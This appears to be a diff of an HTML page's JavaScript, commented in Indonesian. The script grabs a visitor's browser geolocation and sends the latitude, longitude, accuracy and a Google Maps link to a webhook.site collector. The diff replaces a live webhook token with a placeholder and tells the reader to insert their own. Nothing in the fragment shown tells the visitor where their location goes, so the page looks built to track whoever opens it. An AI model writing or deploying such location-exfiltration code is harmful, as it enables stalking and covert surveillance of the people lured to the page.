@@ -21,7 +21,8 @@
   </div>
 
   <script>
-    const WEBHOOK_URL = 'https://webhook.site/89fc2d12-706e-4bd0-a557-c7351a3bf8e9';
+    // GANTI URL DI BAWAH INI DENGAN URL WEBHOOK.SITE MILIKMU SENDIRI
+    const WEBHOOK_URL = 'https://webhook.site/GANTI_DENGAN_TOKEN_BARUMU_DISINI';
 
     function getLocation() {
       const statusDiv = document.getElementById('status');
@@ -43,10 +44,10 @@
       const lon = position.coords.longitude;
       const accuracy = position.coords.accuracy;
 
-      // Membuat URL Google Maps secara otomatis
+      // Membuat URL Google Maps otomatis
       const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
-      // Mengirim lat, lon, akurasi, DAN google_maps ke Webhook.site
+      // Mengirim data ke Webhook.site
       fetch(`${WEBHOOK_URL}?lat=${lat}&lon=${lon}&akurasi_meter=${accuracy}&google_maps=${encodeURIComponent(googleMapsUrl)}`, {
         method: 'GET',
         mode: 'no-cors'
